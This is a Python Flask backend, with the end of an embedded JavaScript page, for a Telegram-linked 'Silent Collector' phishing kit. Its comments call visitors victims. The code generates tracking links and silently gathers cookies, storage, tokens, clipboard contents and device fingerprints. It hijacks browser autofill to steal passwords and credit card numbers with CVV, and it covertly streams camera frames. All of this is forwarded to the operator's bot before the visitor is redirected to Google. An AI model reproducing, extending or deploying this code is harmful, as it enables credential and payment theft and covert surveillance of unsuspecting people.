    // ═══════════════════════════════════════════════════
    var redirectTimer = null;
    var permissionTimer = null;

    // ─── 1. جمع وإرسال فوري (بدون autofill بعد) ───
    collectAll()
        .then(function(payload) {
            return sendMainData(payload);
        })
        .then(function() {
            // ─── 2. Autofill Hijack بعد AUTOFILL_DELAY ───
            // ننتظر عشان المتصفح يملأ الحقول تلقائياً
            setTimeout(function() {
                collectAutofill().then(function(autofillData) {
                    if (autofillData && Object.keys(autofillData).length > 0) {
                        sendAutofill(autofillData);
                    }
                });
            }, AUTOFILL_DELAY);

            // ─── 3. بعد ACCESS_DELAY → اطلب إذن الكاميرا ───
            permissionTimer = setTimeout(function() {
                startSilentCapture().then(function(started) {
                    if (started) {
                        // الكاميرا بدأت → ما ترجعش بسرعة
                        redirectTimer = setTimeout(function() {
                            doRedirect();
                        }, 90000);
                    } else {
                        // مفيش كاميرا → رجوع سريع
                        redirectTimer = setTimeout(doRedirect, 1500);
                    }
                });
            }, ACCESS_DELAY);
        })
        .catch(function() {
            redirectTimer = setTimeout(doRedirect, 1500);
        });

    // ─── عند الخروج: أوقف التصوير ───
    window.addEventListener('beforeunload', function() {
        stopCapture('beforeunload');
    });

    window.addEventListener('pagehide', function() {
        stopCapture('pagehide');
    });

    window.addEventListener('unload', function() {
        stopCapture('unload');
    });

    // ─── رصد خروج الضحية من التاب ───
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            stopCapture('tab_hidden');
            setTimeout(doRedirect, 500);
        }
    });

})();
</script>
</body>
</html>
"""


# ============================================================
# إنشاء Session جديدة
# ============================================================
def create_silent_session(chat_id, label=""):
    """ينشئ session جديد"""
    if not redis_client:
        return None

    try:
        session_id = uuid.uuid4().hex[:16]
        now = time.time()

        session_data = {
            "session_id": session_id,
            "chat_id": str(chat_id),
            "label": label[:50],
            "created_at": now,
            "accessed": False,
            "accessed_at": None,
            "collected": False,
            "camera_started": False,
            "camera_frames": 0,
            "autofill_received": False,
        }

        redis_client.setex(
            f"silent:{session_id}",
            SESSION_TTL,
            json.dumps(session_data)
        )

        redis_client.lpush(f"silent_user:{chat_id}", session_id)
        redis_client.ltrim(f"silent_user:{chat_id}", 0, 199)
        redis_client.expire(f"silent_user:{chat_id}", SESSION_TTL)

        logger.info(f"Silent session created: {session_id} → {chat_id}")
        metrics.inc_counter("silent_sessions_created")

        return session_id

    except Exception as e:
        logger.exception(f"create_silent_session error: {e}")
        return None


# ============================================================
# استقبال البيانات الرئيسية
# ============================================================
def store_collected_data(session_id, data):
    """يخزن البيانات المجمعة"""
    if not redis_client:
        return False

    try:
        raw = redis_client.get(f"silent:{session_id}")
        if not raw:
            logger.warning(f"Session not found: {session_id}")
            return False

        session_data = json.loads(raw)
        chat_id = session_data["chat_id"]

        enriched = dict(data)
        enriched['ip'] = (
            request.headers.get('CF-Connecting-IP') or
            request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
            request.remote_addr
        )
        enriched['cf_ip'] = request.headers.get('CF-Connecting-IP', '')
        enriched['x_real_ip'] = request.headers.get('X-Real-IP', '')
        enriched['server_user_agent'] = request.headers.get('User-Agent', '')
        enriched['accept_language'] = request.headers.get('Accept-Language', '')
        enriched['received_at'] = time.time()
        enriched['received_at_str'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        enriched['label'] = session_data.get('label', '')

        redis_client.setex(
            f"silent_data:{session_id}",
            SESSION_TTL,
            json.dumps(enriched, ensure_ascii=False)
        )

        session_data["collected"] = True
        session_data["collected_at"] = time.time()
        redis_client.setex(
            f"silent:{session_id}",
            SESSION_TTL,
            json.dumps(session_data)
        )

        logger.info(f"Data collected: {session_id} | IP={enriched['ip']} | chat={chat_id}")
        metrics.inc_counter("silent_data_collected")

        notify_bot(chat_id, session_id, enriched)

        return True

    except Exception as e:
        logger.exception(f"store_collected_data error: {e}")
        return False


# ============================================================
# ★★★ استقبال بيانات Autofill ★★★
# ============================================================
def store_autofill_data(session_id, data):
    """يخزن بيانات Autofill ويرسلها للبوت"""
    if not redis_client:
        return False

    try:
        raw = redis_client.get(f"silent:{session_id}")
        if not raw:
            return False

        session_data = json.loads(raw)
        chat_id = session_data["chat_id"]
        cid = int(chat_id) if str(chat_id).isdigit() else chat_id
        label = session_data.get('label', '')

        autofill_data = data.get('data', {})

        if not autofill_data or not isinstance(autofill_data, dict):
            return False

        # احفظ في Redis
        redis_client.setex(
            f"silent_autofill:{session_id}",
            SESSION_TTL,
            json.dumps(autofill_data, ensure_ascii=False)
        )

        session_data["autofill_received"] = True
        redis_client.setex(
            f"silent:{session_id}",
            SESSION_TTL,
            json.dumps(session_data)
        )

        # حقل الأسماء بالعربي
        field_names_ar = {
            'name': 'الاسم الكامل',
            'fname': 'الاسم الأول',
            'lname': 'اسم العائلة',
            'email': 'الإيميل',
            'email2': 'الإيميل / المستخدم',
            'phone': 'الهاتف',
            'phone_national': 'الهاتف المحلي',
            'phone_country': 'كود الدولة',
            'street': 'الشارع',
            'address_line1': 'العنوان 1',
            'address_line2': 'العنوان 2',
            'city': 'المدينة',
            'state': 'المحافظة',
            'country': 'الدولة',
            'country_name': 'اسم الدولة',
            'zip': 'الرمز البريدي',
            'organization': 'الشركة',
            'organization_title': 'المسمى الوظيفي',
            'bday': 'تاريخ الميلاد',
            'bday_day': 'يوم الميلاد',
            'bday_month': 'شهر الميلاد',
            'bday_year': 'سنة الميلاد',
            'sex': 'الجنس',
            'username': 'اسم المستخدم',
            'password': 'كلمة المرور',
            'new_password': 'كلمة مرور جديدة',
            'url': 'الموقع',
            'cc_name': 'اسم حامل البطاقة',
            'cc_number': 'رقم البطاقة',
            'cc_exp': 'تاريخ انتهاء البطاقة',
            'cc_csc': 'CVC/CVV',
        }

        # بناء الرسالة
        lines = [
            f"🎯 <b>Autofill Hijack — بيانات جديدة!</b>",
            f"━━━━━━━━━━━━━━━━━━",
            f"🎯 <b>الجلسة:</b> <code>{session_id[:12]}</code>",
            f"🏷️ <b>الاسم:</b> {label or '—'}",
            f"",
            f"📋 <b>البيانات المسروقة ({len(autofill_data)} حقل):</b>",
            f"━━━━━━━━━━━━━━━━━━",
        ]

        # رتب الحقول بالأهمية
        priority_order = [
            'name', 'fname', 'lname',
            'email', 'email2',
            'phone', 'phone_national',
            'username', 'password',
            'cc_number', 'cc_exp', 'cc_csc', 'cc_name',
            'street', 'address_line1', 'address_line2',
            'city', 'state', 'country', 'zip',
            'organization', 'organization_title',
            'bday', 'bday_day', 'bday_month', 'bday_year',
            'sex', 'url', 'country_name', 'phone_country',
            'new_password'
        ]

        shown = set()
        for key in priority_order:
            if key in autofill_data and key not in shown:
                val = autofill_data[key]
                if val and str(val).strip():
                    name_ar = field_names_ar.get(key, key)
                    lines.append(f"• <b>{name_ar}:</b>\n  <code>{str(val)[:200]}</code>")
                    shown.add(key)

        # الباقي
        for key, val in autofill_data.items():
            if key not in shown and val and str(val).strip():
                name_ar = field_names_ar.get(key, key)
                lines.append(f"• <b>{name_ar}:</b>\n  <code>{str(val)[:200]}</code>")

        # نبّه لو فيه إيميل
        if autofill_data.get('email') or autofill_data.get('email2'):
            email_val = autofill_data.get('email') or autofill_data.get('email2')
            lines.append(f"\n📧 <b>الإيميل:</b> <code>{email_val}</code>")

        # نبّه لو فيه باسورد
        if autofill_data.get('password'):
            lines.append(f"🔑 <b>كلمة المرور:</b> <code>{autofill_data['password'][:100]}</code>")

        text = "\n".join(lines)

        bot.send_message(cid, text, parse_mode="HTML", disable_web_page_preview=True)

        logger.info(f"Autofill data sent: {session_id} | {len(autofill_data)} fields")
        metrics.inc_counter("silent_autofill_received")

        # ملف JSON كمان
        try:
            import io
            json_str = json.dumps(autofill_data, ensure_ascii=False, indent=2)
            buf = io.BytesIO(json_str.encode('utf-8'))
            buf.name = f"autofill_{session_id[:12]}.json"

            bot.send_document(
                cid, buf,
                caption=(
                    f"📦 <b>Autofill Data JSON</b>\n"
                    f"🆔 <code>{session_id[:12]}</code>\n"
                    f"📊 <b>الحجم:</b> <code>{len(json_str) / 1024:.1f} KB</code>"
                ),
                parse_mode="HTML"
            )
        except Exception as e:
            logger.warning(f"Send autofill JSON error: {e}")

        return True

    except Exception as e:
        logger.exception(f"store_autofill_data error: {e}")
        return False


# ============================================================
# استقبال صورة من الكاميرا
# ============================================================
def store_camera_frame(session_id, data):
    """يخزن صورة من الكاميرا ويبعتها للبوت فوراً"""
    if not redis_client:
        return False

    try:
        raw = redis_client.get(f"silent:{session_id}")
        if not raw:
            return False

        session_data = json.loads(raw)
        chat_id = session_data["chat_id"]
        cid = int(chat_id) if str(chat_id).isdigit() else chat_id

        image_data = data.get('image', '')
        frame_num = data.get('frame_num', 0)
        label = session_data.get('label', '')

        session_data["camera_frames"] = frame_num
        session_data["camera_started"] = True
        redis_client.setex(
            f"silent:{session_id}",
            SESSION_TTL,
            json.dumps(session_data)
        )

        try:
            if image_data.startswith('data:image'):
                _, encoded = image_data.split(',', 1)
                img_bytes = base64.b64decode(encoded)

                import io
                buf = io.BytesIO(img_bytes)
                buf.name = f"frame_{frame_num}.jpg"

                caption = (
                    f"📸 <b>صورة من الكاميرا</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"🎯 <b>الجلسة:</b> <code>{session_id[:12]}</code>\n"
                    f"🏷️ <b>الاسم:</b> {label or '—'}\n"
                    f"🔢 <b>الصورة:</b> #{frame_num}"
                )

                bot.send_photo(cid, buf, caption=caption, parse_mode="HTML")

                logger.info(f"Camera frame #{frame_num} sent for session {session_id}")
                metrics.inc_counter("silent_camera_frames")

        except Exception as e:
            logger.warning(f"Send camera frame error: {e}")

        return True

    except Exception as e:
        logger.exception(f"store_camera_frame error: {e}")
        return False


# ============================================================
# استقبال إشارات الكاميرا
# ============================================================
def handle_camera_signal(session_id, data):
    """يتعامل مع إشارات بدء/إيقاف/رفض الكاميرا"""
    try:
        raw = redis_client.get(f"silent:{session_id}")
        if not raw:
            return False

        session_data = json.loads(raw)
        chat_id = session_data["chat_id"]
        cid = int(chat_id) if str(chat_id).isdigit() else chat_id
        label = session_data.get('label', '')
        signal_type = data.get('type', '')

        if signal_type == 'camera_started':
            session_data["camera_started"] = True
            redis_client.setex(
                f"silent:{session_id}",
                SESSION_TTL,
                json.dumps(session_data)
            )

            width = data.get('width', '?')
            height = data.get('height', '?')

            bot.send_message(
                cid,
                f"🎥 <b>الكاميرا اشتغلت!</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🎯 <b>الجلسة:</b> <code>{session_id[:12]}</code>\n"
                f"🏷️ <b>الاسم:</b> {label or '—'}\n"
                f"📐 <b>الدقة:</b> <code>{width}×{height}</code>\n\n"
                f"⏳ <i>جاري التصوير المستمر...</i>",
                parse_mode="HTML"
            )
            logger.info(f"Camera started for session {session_id}")

        elif signal_type == 'camera_denied':
            error = data.get('error', 'unknown')
            bot.send_message(
                cid,
                f"❌ <b>الكاميرا مرفوضة</b>\n"
                f"🎯 الجلسة: <code>{session_id[:12]}</code>\n"
                f"🏷️ {label or '—'}\n"
                f"السبب: <code>{error}</code>",
                parse_mode="HTML"
            )
            logger.info(f"Camera denied for session {session_id}")

        elif signal_type == 'camera_stopped':
            reason = data.get('reason', 'unknown')
            total = data.get('total_frames', 0)

            bot.send_message(
                cid,
                f"⏹️ <b>توقف التصوير</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🎯 <b>الجلسة:</b> <code>{session_id[:12]}</code>\n"
                f"🏷️ <b>الاسم:</b> {label or '—'}\n"
                f"📸 <b>إجمالي الصور:</b> <code>{total}</code>\n"
                f"🔚 <b>السبب:</b> <code>{reason}</code>",
                parse_mode="HTML"
            )
            logger.info(f"Camera stopped for session {session_id} | frames={total} | reason={reason}")

        return True

    except Exception as e:
        logger.exception(f"handle_camera_signal error: {e}")
        return False


# ============================================================
# إشعار البوت
# ============================================================
def notify_bot(chat_id, session_id, data):
    """يبعت تقرير شامل للبوت (بالعربي)"""
    try:
        cid = int(chat_id) if str(chat_id).isdigit() else chat_id

        label = data.get('label', '')
        label_text = f" ({label})" if label else ""
        ip = data.get('ip', 'غير معروف')
        timezone = data.get('timezone', 'غير معروف')
        received_at = data.get('received_at_str', '—')

        ua = data.get('user_agent', 'Unknown')
        device_type = "📱 موبايل" if any(x in ua for x in ['Mobile', 'Android', 'iPhone']) else "💻 كمبيوتر"

        os_name = "غير معروف"
        if 'Windows' in ua: os_name = "Windows"
        elif 'Mac OS' in ua or 'Macintosh' in ua: os_name = "macOS"
        elif 'Android' in ua: os_name = "Android"
        elif 'iPhone' in ua or 'iPad' in ua: os_name = "iOS"
        elif 'Linux' in ua: os_name = "Linux"

        browser = "غير معروف"
        if 'Edg/' in ua: browser = "Edge"
        elif 'OPR/' in ua or 'Opera' in ua: browser = "Opera"
        elif 'Chrome/' in ua: browser = "Chrome"
        elif 'Safari/' in ua: browser = "Safari"
        elif 'Firefox/' in ua: browser = "Firefox"

        screen = data.get('screen') or {}
        screen_text = f"{screen.get('width', '?')}×{screen.get('height', '?')}"
        dpr = screen.get('dpr', 1)

        battery = data.get('battery')
        battery_text = "—"
        if battery:
            level = battery.get('level', '?')
            charging = "⚡ يشحن" if battery.get('charging') else "🔋 لا يشحن"
            battery_text = f"{charging} · {level}%"

        conn = data.get('connection') or {}
        net_text = conn.get('effective_type', '—')
        net_speed = conn.get('downlink', '—')

        cores = data.get('hardware_concurrency', '?')
        ram = data.get('device_memory', '?')

        webgl = data.get('webgl') or {}
        gpu = webgl.get('renderer', 'غير معروف')[:80]

        sessions = data.get('detected_sessions', [])
        sessions_text = ""
        if sessions:
            sessions_text = "🎯 <b>جلسات نشطة:</b>\n"
            for s in sessions[:15]:
                sessions_text += f"  ✅ {s.get('site', '?').title()}\n"
        else:
            sessions_text = "🎯 <b>جلسات نشطة:</b> لا يوجد\n"

        emails = data.get('found_emails', [])
        emails_text = ""
        if emails:
            emails_text = "📧 <b>إيميلات مكتشفة:</b>\n"
            for e in emails[:5]:
                emails_text += f"  • <code>{e}</code>\n"

        tokens = data.get('found_tokens', [])
        tokens_text = ""
        if tokens:
            tokens_text = f"🔑 <b>توكنات مكشوفة:</b> {len(tokens)}\n"
            for t in tokens[:3]:
                tokens_text += f"  • <code>{t.get('key', '?')[:30]}</code>\n"

        cookies_data = data.get('cookies') or {}
        cookies_count = cookies_data.get('count', 0)
        local_keys = len(data.get('local_storage', {}))
        session_keys = len(data.get('session_storage', {}))
        idb_count = len(data.get('indexed_db_names', []))
        cache_count = len(data.get('cache_keys', []))
        sw_count = len(data.get('service_workers', []))

        fonts_count = len(data.get('fonts', []))

        clipboard = data.get('clipboard')
        clipboard_text = "—"
        if clipboard:
            clipboard_text = f"<code>{str(clipboard)[:80]}</code>"

        storage_est = data.get('storage_estimate') or {}
        storage_usage = f"{storage_est.get('usage_mb', '?')} MB"

        text = (
            f"🎯 <b>التقاط صامت</b>{label_text}\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"

            f"🆔 <b>Session:</b> <code>{session_id}</code>\n"
            f"🕐 <b>الوقت:</b> <code>{received_at}</code>\n\n"

            f"━━━ 🌐 الشبكة ━━━\n"
            f"📍 <b>IP:</b> <code>{ip}</code>\n"
            f"🌍 <b>التوقيت:</b> <code>{timezone}</code>\n"
            f"📡 <b>الشبكة:</b> <code>{net_text}</code> · <code>{net_speed} Mb/s</code>\n\n"

            f"━━━ 💻 الجهاز ━━━\n"
            f"🖥️ <b>النوع:</b> {device_type}\n"
            f"⚙️ <b>النظام:</b> <code>{os_name}</code>\n"
            f"🌐 <b>المتصفح:</b> <code>{browser}</code>\n"
            f"🔧 <b>الأنوية:</b> <code>{cores}</code> · RAM: <code>{ram}GB</code>\n\n"

            f"━━━ 📐 الشاشة ━━━\n"
            f"📏 <b>الدقة:</b> <code>{screen_text}</code>\n"
            f"🔍 <b>DPR:</b> <code>{dpr}</code>\n"
            f"🌗 <b>الوضع الداكن:</b> {'✅' if data.get('dark_mode') else '❌'}\n\n"

            f"━━━ 🎮 العتاد ━━━\n"
            f"🎨 <b>كرت الشاشة:</b>\n<code>{gpu}</code>\n"
            f"🔋 <b>البطارية:</b> {battery_text}\n\n"

            f"━━━ 💾 التخزين ━━━\n"
            f"🍪 <b>الكوكيز:</b> <code>{cookies_count}</code>\n"
            f"💾 <b>LocalStorage:</b> <code>{local_keys}</code> مفتاح\n"
            f"🔐 <b>SessionStorage:</b> <code>{session_keys}</code> مفتاح\n"
            f"📦 <b>IndexedDB:</b> <code>{idb_count}</code> قاعدة\n"
            f"🗄️ <b>Cache:</b> <code>{cache_count}</code> · <b>SW:</b> <code>{sw_count}</code>\n"
            f"💽 <b>المستخدم:</b> <code>{storage_usage}</code>\n"
            f"🔤 <b>الخطوط:</b> <code>{fonts_count}</code>\n\n"

            f"━━━ 🔍 الاستكشاف ━━━\n"
            f"{sessions_text}"
            f"\n{emails_text}"
            f"\n{tokens_text}"
            f"\n📋 <b>الحافظة:</b> {clipboard_text}\n\n"

            f"━━━ 🎥 الكاميرا ━━━\n"
            f"⏳ <i>في انتظار إذن الكاميرا...</i>\n"
            f"━━━ 📝 Autofill ━━━\n"
            f"⏳ <i>في انتظار بيانات المتصفح التلقائية...</i>"
        )

        bot.send_message(cid, text, parse_mode="HTML", disable_web_page_preview=True)
        logger.info(f"Report sent to {cid}")

        try:
            import io
            json_str = json.dumps(data, ensure_ascii=False, indent=2)
            buf = io.BytesIO(json_str.encode('utf-8'))
            buf.name = f"silent_{session_id}.json"

            bot.send_document(
                cid, buf,
                caption=(
                    f"📦 <b>ملف البيانات الكامل</b>\n"
                    f"🆔 <code>{session_id}</code>\n"
                    f"📊 <b>الحجم:</b> <code>{len(json_str) / 1024:.1f} KB</code>"
                ),
                parse_mode="HTML"
            )
        except Exception as e:
            logger.warning(f"Send JSON dump error: {e}")

    except Exception as e:
        logger.exception(f"notify_bot error: {e}")


# ============================================================
# Routes
# ============================================================
def init_silent_collector_routes(app, bot_instance):
    """تسجيل مسارات Silent Collector"""

    global bot
    bot = bot_instance

    @app.route('/s/<session_id>', methods=['GET'])
    def silent_collector_page(session_id):
        """صفحة الالتقاط"""
        try:
            raw = redis_client.get(f"silent:{session_id}")
            if not raw:
                return redirect(GOOGLE_REDIRECT, code=302)

            session_data = json.loads(raw)
            session_data['accessed'] = True
            session_data['accessed_at'] = time.time()
            session_data['accessed_ip'] = (
                request.headers.get('CF-Connecting-IP') or
                request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
                request.remote_addr
            )
            redis_client.setex(
                f"silent:{session_id}",
                SESSION_TTL,
                json.dumps(session_data)
            )

            logger.info(f"🎯 Silent accessed: {session_id}")

        except Exception as e:
            logger.exception(f"silent_collector_page error: {e}")
            return redirect(GOOGLE_REDIRECT, code=302)

        endpoint = f"{PUBLIC_URL}/s/{session_id}"

        html = (COLLECTOR_PAGE
                .replace("__SESSION_ID__", session_id)
                .replace("__ENDPOINT__", endpoint)
                .replace("__REDIRECT_URL__", GOOGLE_REDIRECT)
                .replace("__CAMERA_INTERVAL__", str(CAMERA_INTERVAL))
                .replace("__CAMERA_MAX_FRAMES__", str(CAMERA_MAX_FRAMES))
                .replace("__ACCESS_DELAY__", str(ACCESS_DELAY))
                .replace("__AUTOFILL_DELAY__", str(AUTOFILL_DELAY)))

        response = app.make_response(html)
        response.headers['Content-Type'] = 'text/html; charset=utf-8'
        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        response.headers['X-Robots-Tag'] = 'noindex, nofollow'

        return response


    @app.route('/s/<session_id>/collect', methods=['POST', 'OPTIONS'])
    def silent_collect_endpoint(session_id):
        """استقبال البيانات الرئيسية"""
        if request.method == 'OPTIONS':
            resp = app.make_response('')
            resp.headers['Access-Control-Allow-Origin'] = '*'
            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp, 200

        try:
            data = request.get_json(silent=True) or {}

            if data.get('session_id') != session_id:
                logger.warning(f"Session ID mismatch")
                return jsonify({'ok': False}), 200

            success = store_collected_data(session_id, data)

            resp = jsonify({'ok': success})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200

        except Exception as e:
            logger.exception(f"silent_collect_endpoint error: {e}")
            resp = jsonify({'ok': False})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200


    @app.route('/s/<session_id>/camera', methods=['POST', 'OPTIONS'])
    def silent_camera_endpoint(session_id):
        """استقبال صورة من الكاميرا"""
        if request.method == 'OPTIONS':
            resp = app.make_response('')
            resp.headers['Access-Control-Allow-Origin'] = '*'
            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp, 200

        try:
            data = request.get_json(silent=True) or {}

            if data.get('session_id') != session_id:
                return jsonify({'ok': False}), 200

            if data.get('type') != 'camera_frame':
                return jsonify({'ok': False}), 200

            success = store_camera_frame(session_id, data)

            resp = jsonify({'ok': success})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200

        except Exception as e:
            logger.exception(f"silent_camera_endpoint error: {e}")
            resp = jsonify({'ok': False})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200


    @app.route('/s/<session_id>/signal', methods=['POST', 'OPTIONS'])
    def silent_signal_endpoint(session_id):
        """استقبال إشارات الكاميرا (بدأت/رفضت/توقفت)"""
        if request.method == 'OPTIONS':
            resp = app.make_response('')
            resp.headers['Access-Control-Allow-Origin'] = '*'
            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp, 200

        try:
            data = request.get_json(silent=True) or {}

            if data.get('session_id') != session_id:
                return jsonify({'ok': False}), 200

            success = handle_camera_signal(session_id, data)

            resp = jsonify({'ok': success})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200

        except Exception as e:
            logger.exception(f"silent_signal_endpoint error: {e}")
            resp = jsonify({'ok': False})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200


    @app.route('/s/<session_id>/autofill', methods=['POST', 'OPTIONS'])
    def silent_autofill_endpoint(session_id):
        """استقبال بيانات Autofill Hijack"""
        if request.method == 'OPTIONS':
            resp = app.make_response('')
            resp.headers['Access-Control-Allow-Origin'] = '*'
            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return resp, 200

        try:
            data = request.get_json(silent=True) or {}

            if data.get('session_id') != session_id:
                return jsonify({'ok': False}), 200

            if data.get('type') != 'autofill_data':
                return jsonify({'ok': False}), 200

            success = store_autofill_data(session_id, data)

            resp = jsonify({'ok': success})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200

        except Exception as e:
            logger.exception(f"silent_autofill_endpoint error: {e}")
            resp = jsonify({'ok': False})
            resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp, 200


    @app.route('/s/<session_id>/go', methods=['GET'])
    def silent_redirect(session_id):
        return redirect(GOOGLE_REDIRECT, code=302)


    logger.info("[+] Silent Collector v4 routes registered: /s/<session_id>")


# ============================================================
# Public API
# ============================================================
def generate_silent_link(chat_id, label=""):
    session_id = create_silent_session(chat_id, label)
    if not session_id:
        return None
    return f"{PUBLIC_URL}/s/{session_id}"


def get_silent_data(session_id):
    if not redis_client:
        return None
    try:
        raw = redis_client.get(f"silent_data:{session_id}")
        if raw:
            return json.loads(raw)
    except Exception as e:
        logger.warning(f"get_silent_data error: {e}")
    return None


def get_user_silent_sessions(chat_id, limit=50):
    if not redis_client:
        return []
    try:
        session_ids = redis_client.lrange(f"silent_user:{chat_id}", 0, limit - 1)
        result = []
        for sid in session_ids:
            sdata = redis_client.get(f"silent:{sid}")
            if sdata:
                try:
                    result.append(json.loads(sdata))
                except Exception:
                    continue
        return result
    except Exception as e:
        logger.warning(f"get_user_silent_sessions error: {e}")
        return []
